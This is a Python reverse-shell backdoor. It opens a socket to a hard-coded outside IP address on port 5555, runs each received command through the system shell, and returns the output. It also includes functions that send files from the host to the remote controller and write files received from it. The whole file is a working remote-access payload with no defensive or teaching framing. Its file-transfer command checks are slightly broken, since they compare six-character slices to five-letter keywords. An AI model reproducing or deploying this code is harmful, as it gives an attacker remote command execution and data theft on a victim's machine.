import subprocess
import socket
import json

# INCOMING + DECODING
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# OUTGOING + ENCODE
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


# DOWNLOAD FILE
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            pass
    s.settimeout(None)
    f.close()


# SHELL PROCESS
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break

        elif command[:6] == 'uload':
            download_file(command[7:])

        elif command[:6] == 'dload':
            upload_file(command[7:])


        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.46.208.167', 5555))
shell()
